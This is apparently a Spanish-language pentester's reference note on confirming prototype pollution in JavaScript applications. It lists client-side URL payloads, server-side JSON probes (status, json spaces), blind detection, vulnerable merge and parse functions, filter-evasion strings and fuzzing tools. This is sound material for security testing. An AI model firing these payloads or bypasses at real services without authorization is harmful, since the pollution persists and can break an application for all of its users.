---
tipo: meta
aliases:
  - confirmar prototype pollution
  - __proto__
tags:
  - meta/referencia
  - dominio/web
---

# Prototype pollution - matriz de identificación

> [!info] Referencia pura, no un zettel
> Confirmar que se puede contaminar, y por dónde. Los gadget están en [[Prototype pollution gadgets - matriz de referencia]]; el criterio, en [[MOC - Prototype pollution]].

Contaminar es la mitad barata y hay que confirmarla antes de pensar en impacto. Cinco minutos acá ahorran una tarde probando gadget contra una aplicación que no era vulnerable.

## 1. Las tres claves

| Clave | Cuándo se usa |
|---|---|
| `__proto__` | La directa. La que todo filtro conoce |
| `constructor.prototype` | El mismo destino, otro camino. **La que se olvidan de filtrar** |
| `prototype` | Cuando lo contaminado es una función |

Probar siempre las tres. Un filtro que solo bloquea la primera es la situación más común.

## 2. Lado del cliente — confirmación

Se pega en la URL y se mira la consola.

`?__proto__[contaminado]=si`
`?__proto__.contaminado=si`
`?constructor[prototype][contaminado]=si`
`?constructor.prototype.contaminado=si`

Y en el fragmento, que es donde muchas aplicaciones parsean:

`#__proto__[contaminado]=si`
`#/ruta?__proto__[contaminado]=si`

Después, en la consola del navegador:

```js
Object.prototype.contaminado   // "si" → contaminado
({}).contaminado
```

> [!tip] Usar un nombre inventado
> `contaminado` y no `esAdmin`. La contaminación persiste en la página y tocar nombres reales cambia el comportamiento de la aplicación mientras se prueba, lo que confunde el diagnóstico propio antes que a nadie más.

## 3. Lado del servidor — confirmación

En un cuerpo JSON:

```json
{"__proto__": {"contaminado": "si"}}
{"constructor": {"prototype": {"contaminado": "si"}}}
```

En una query string o en un cuerpo con codificación de formulario:

`__proto__[contaminado]=si`
`constructor[prototype][contaminado]=si`

Como el servidor no da consola, hace falta un canal. En orden de fiabilidad:

| Prueba | Qué se observa |
|---|---|
| `{"__proto__":{"status":510}}` | La respuesta vuelve con **código 510** |
| `{"__proto__":{"json spaces":10}}` | El JSON de la respuesta sale con sangría rara |
| `{"__proto__":{"exposedHeaders":["x"]}}` | Aparece una cabecera nueva |
| `{"__proto__":{"content-type":"text/plain"}}` | Cambia el tipo de contenido |
| `{"__proto__":{"parameterLimit":1}}` | Peticiones posteriores fallan por límite |

Las dos primeras son las de mejor rendimiento contra Express: son propiedades que el marco de trabajo lee de un objeto de opciones que casi nunca las trae.

`{"__proto__":{"contaminado":"si"}}` seguido de un endpoint que devuelva un objeto serializado también sirve: si el objeto vuelve con la propiedad de más, está contaminado.

> [!danger] La contaminación del servidor persiste
> No se limpia al terminar la petición: queda hasta que el proceso se reinicie, y afecta a todos los usuarios. Contaminar `status` deja **toda** la aplicación devolviendo `510`. Confirmar con propiedades inocuas y avisar antes de tocar nada que altere el comportamiento.

## 4. Detección ciega por tiempo

Cuando ninguna de las anteriores refleja nada:

```json
{"__proto__":{"REQUIRED_KEYS":"x"}}
```

Contaminar algo que rompa una validación y observar si aparecen errores. La señal es que **peticiones posteriores no relacionadas** empiezan a fallar — es lenta, contamina el entorno y hay que usarla último.

## 5. Funciones vulnerables

Lo que hay que buscar en el código o en las dependencias.

| Familia | Ejemplos |
|---|---|
| Mezcla profunda | `merge` · `deepmerge` · `defaultsDeep` · `mergeWith` · `extend(true, ...)` |
| Asignación por ruta | `set(obj, ruta, valor)` · `setWith` · `objectPath.set` |
| Clonado | `cloneDeep` · clonados a mano con recursión |
| Parseo de query | `qs.parse` · `query-string` viejo · parseos propios que dividen por `&` y `.` |
| Zonas | `Object.assign` recursivo escrito a mano |

Las nativas **no** contaminan: `URLSearchParams`, `Object.assign` a un nivel, `structuredClone`, y `JSON.parse` por sí solo. `JSON.parse` produce un objeto con la clave `__proto__` como dato inerte; el problema aparece cuando ese objeto se **mezcla** con otro.

Esa distinción es la que hay que explicar en el informe: el fallo no es parsear, es copiar.

## 6. Dónde entra la contaminación

| Vector | Nota |
|---|---|
| Cuerpo JSON mezclado con opciones | El más común del lado del servidor |
| Query string parseada con `qs` | El más común del lado del cliente |
| Fragmento de la URL | Solo cliente. **El servidor no lo ve** |
| Cuerpo con codificación de formulario | Igual que JSON si se mezcla |
| Documento de una base NoSQL | Contaminación almacenada: persiste entre reinicios |
| Archivo de configuración subido | Se cruza con [[MOC - File upload]] |

La quinta es la más grave y la menos buscada: si el objeto contaminado se guarda y se vuelve a cargar, la contaminación sobrevive al reinicio del proceso.

## 7. Evasión de filtros

Cuando `__proto__` está bloqueado:

`constructor[prototype][x]=1`
`__pro__proto__to__[x]=1` — contra un reemplazo no recursivo de la cadena
`__proto__.__proto__[x]=1`
`%5f%5fproto%5f%5f[x]=1`
`__%70roto__[x]=1`
`{"__proto__":{"x":1}}` — escape unicode en JSON

El segundo es el que más rinde: un filtro que quita `__proto__` una sola vez y no vuelve a mirar deja la cadena reconstruida.

## 8. Herramienta

`ppmap`
`npx ppfuzz -u 'https://objetivo/?'`

Extensión **DOM Invader** de Burp con la opción de prototype pollution: contamina y busca gadget en las bibliotecas cargadas de forma automática. Es lo más rentable para el lado del cliente y ahorra la mayor parte del trabajo manual de [[Prototype pollution gadgets - matriz de referencia]].

## 9. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `Object.prototype.contaminado` sigue indefinido | No contamina por ese vector. Probar `constructor[prototype]` |
| Contamina en la consola y no pasa nada más | Falta el gadget. Es la mitad del trabajo, no el final |
| El servidor devuelve `500` después de probar | Contaminaste algo que rompió el proceso. Reiniciar, y anotarlo |
| Funciona una vez y después no | Varios procesos detrás de un balanceador. La contaminación quedó en uno |
| `JSON.parse` y no contamina | Correcto: parsear no contamina, copiar sí. Buscar dónde se mezcla |
| El fragmento no llega al servidor | Es esperado. El fragmento es solo del lado del cliente |
| Todo bloqueado | Puede haber `Object.freeze(Object.prototype)`. Verificar con `Object.isFrozen(Object.prototype)` |

## Relacionadas

[[MOC - Prototype pollution]] · [[Prototype pollution gadgets - matriz de referencia]] · [[CWE-1321 - Prototype Pollution]] · [[Control de acceso - matriz de pruebas]]
